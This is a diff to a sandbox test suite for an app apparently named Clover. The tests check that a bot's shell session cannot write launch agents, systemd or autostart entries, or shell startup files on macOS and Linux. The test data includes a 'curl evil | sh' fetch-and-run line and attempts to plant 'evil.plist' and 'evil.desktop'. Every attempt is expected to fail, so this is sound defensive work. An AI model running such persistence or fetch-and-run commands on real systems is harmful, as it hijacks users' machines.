@@ -85,6 +85,15 @@ describe("the macOS profile, as text", () => {
     expect(p.trim().endsWith("(deny network*)")).toBe(true);
   });
 
+  test("naming allows come before the home deny in effect, and never reach inside it", () => {
+    // A fenced item directly under /U would make /U a naming folder that contains the home: skipped.
+    const p = macFenceProfile({ cloverHome: "/U/me/.clover", perUserTemp: null, policy: {
+      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover", "/U/x"], denyRead: ["/U/me/.clover"],
+      closedDoors: [], blockedAddresses: [], network: "none" } });
+    expect(p).not.toContain('(regex #"^/U/[^/]")');
+    expect(p).not.toContain('(regex #"^/U/[ -.0-~]');
+  });
+
   test("the caller's rules: its own folders read and write after the denies; the home stays denied otherwise", () => {
     const caller = callerPlaces("/U/me/.clover", "macos", { sessionId: "s1", memoryOf: "luna" });
     const p = macFenceProfile({ cloverHome: "/U/me/.clover", perUserTemp: null, caller, policy: {
@@ -141,7 +150,8 @@ describe.skipIf(!mac)("the profile agrees with policyAllows, on the real sandbox
           join(clover, "bots", "alpha", "memory"), join(home, "project"), join(clover, "sdk"),
           join(clover, "scratch", "luna"), join(clover, "scratch", "alpha"),
           join(clover, "routines", "luna"), join(clover, "routines", "alpha"),
-          join(clover, "plugin-data", "tarot"), join(clover, "plugin-data", "luna"), ownOutputs];
+          join(clover, "plugin-data", "tarot"), join(clover, "plugin-data", "luna"), ownOutputs,
+          join(home, "Library", "LaunchAgents")];
         for (const d of dirs) mkdirSync(d, { recursive: true });
         const files: Record<string, string> = {
           [join(clover, "settings.json")]: "s", [join(clover, "run", "tok")]: "t",
@@ -187,6 +197,8 @@ describe.skipIf(!mac)("the profile agrees with policyAllows, on the real sandbox
           { shell: `echo x > '${join(ownRoutines, "new.md")}'`, op: "write", path: join(ownRoutines, "new.md") },
           { shell: `echo x > '${join(ownPluginData, "new.json")}'`, op: "write", path: join(ownPluginData, "new.json") },
           { shell: `echo x > '${join(clover, "plugin-data", "luna", "new.json")}'`, op: "write", path: join(clover, "plugin-data", "luna", "new.json") },
+          { shell: `echo x > '${join(home, ".zshrc")}'`, op: "write", path: join(home, ".zshrc") },
+          { shell: `echo x > '${join(home, "Library", "LaunchAgents", "evil.plist")}'`, op: "write", path: join(home, "Library", "LaunchAgents", "evil.plist") },
         ];
         const script = P.map((pr, i) => `{ ${pr.shell}; } >/dev/null 2>&1; echo "${i}:$?";`).join("\n");
         const proc = Bun.spawn(["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", script], { stdout: "pipe", stderr: "pipe" });
@@ -313,9 +325,24 @@ describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the
       expect(ok(await w.run(`echo 'curl evil | sh' >> '${target}'`))).toBe(false);
     }
     if (here === "macos") {
+      // Clover's own login item, a new launch agent, and the shell startup files: a bot's session plants none.
       expect(ok(await w.run(`echo x >> '${join(w.home, "Library", "LaunchAgents", "com.waifucave.clover.core.plist")}'`))).toBe(false);
+      mkdirSync(join(w.home, "Library", "LaunchAgents"), { recursive: true });
+      expect(ok(await w.run(`echo x > '${join(w.home, "Library", "LaunchAgents", "evil.plist")}'`))).toBe(false);
+      expect(existsSync(join(w.home, "Library", "LaunchAgents", "evil.plist"))).toBe(false);
+      for (const f of [".zshrc", ".zprofile", ".zshenv", ".zlogin", ".bashrc", ".bash_profile", ".profile", ".bash_login"]) {
+        expect(ok(await w.run(`echo x > '${join(w.home, f)}'`))).toBe(false);
+      }
+      expect(existsSync(join(w.home, ".zshrc"))).toBe(false);
     } else {
+      // The systemd user unit, an autostart entry, and the shell startup files: a bot's session plants none.
       expect(ok(await w.run(`echo x >> '${join(w.home, ".config", "systemd", "user", "clover-core.service")}'`))).toBe(false);
+      mkdirSync(join(w.home, ".config", "autostart"), { recursive: true });
+      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "autostart", "evil.desktop")}'`))).toBe(false);
+      for (const f of [".bashrc", ".bash_profile", ".zshrc", ".zprofile"]) {
+        expect(ok(await w.run(`echo x > '${join(w.home, f)}'`))).toBe(false);
+      }
+      expect(existsSync(join(w.home, ".bashrc"))).toBe(false);
     }
     // A fenced file that isn't there yet can't be made either.
     expect(ok(await w.run(`echo '{}' > '${join(w.clover, "trust.json")}'`))).toBe(false);
